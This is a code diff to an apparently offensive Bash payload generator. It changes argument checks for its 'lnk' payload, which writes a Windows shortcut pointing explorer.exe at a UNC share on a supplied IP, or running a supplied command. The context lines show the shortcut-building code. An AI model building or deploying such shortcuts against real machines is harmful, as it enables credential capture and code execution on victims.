@@ -134,13 +134,10 @@ function generate() {
                 print "error" "Command and arguments must be passed!"
                 quit 1
             fi
-        fi
 
-        if [[ -z "${IP}" ]]
+        # check if IP is passed if command is not passed
+        elif [[ -n "${IP}" ]]
         then
-            print "error" "IP parameter must at least be passed!"
-            quit 1
-        else
             local unc
             if [[ -z "${SHARE}" ]]
             then
@@ -179,6 +176,10 @@ function generate() {
 
             script+="\$Shortcut.TargetPath = 'C:/Windows/explorer.exe'\n"
             script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
+        
+        else
+            print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
+            quit 1
         fi
 
         if [[ -n "${DESCRIPTION}" ]]
@@ -442,6 +443,17 @@ function main() {
     check_dependencies
 
     ((VERSION == 1)) && echo "${0} version: v1.0"
+
+    # Require either -c or -i (but not both) for 'lnk' payloads
+    if [[ "${PAYLOAD}" == "lnk" ]]; then
+        if [[ -n "${COMMAND}" && -n "${IP}" ]]; then
+            print "error" "Cannot use both -c (command) and -i (IP) together for 'lnk' payload. Choose one."
+            quit 1
+        elif [[ -z "${COMMAND}" && -z "${IP}" ]]; then
+            print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
+            quit 1
+        fi
+    fi
 
     if [[ -n "${OUTPUT}" ]]
     then
